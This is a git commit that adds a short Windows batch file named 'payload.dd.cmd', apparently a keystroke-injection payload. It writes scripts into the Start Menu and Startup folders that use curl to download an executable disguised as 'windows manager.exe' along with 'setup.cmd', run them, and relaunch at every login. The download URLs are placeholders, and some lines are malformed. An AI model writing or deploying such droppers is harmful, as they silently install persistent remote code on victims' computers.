da3d7db246e6fd0009d8bac02e4202f4457b10a0
chamaedoreapruductions <96385448+chamaedoreapruductions@users.noreply.github.com>
2022-03-20 22:23:43 +0100

    Create payload.dd.cmd

---
+++ payload.dd.cmd
@@ -0,0 +1,8 @@
+cd C:
+cd %APPDATA%
+cd Microsoft\Windows\Start Menu\Programs
+echo ^curl smth ^> "windows manager.exe" ^&^& ^curl smth ^> "img.png" ^&^& ^curl smth ^> "setup.cmd" ^&^& setup.cmd ^&^& ^cd Startup ^&^& windows manager.cmd > "windows manager.cmd"
+echo ... > "windows manager.vbs"
+cd Startup
+echo ^cd .. windows manager.cmd > "windows manager.cmd"
+windows manager.cmd
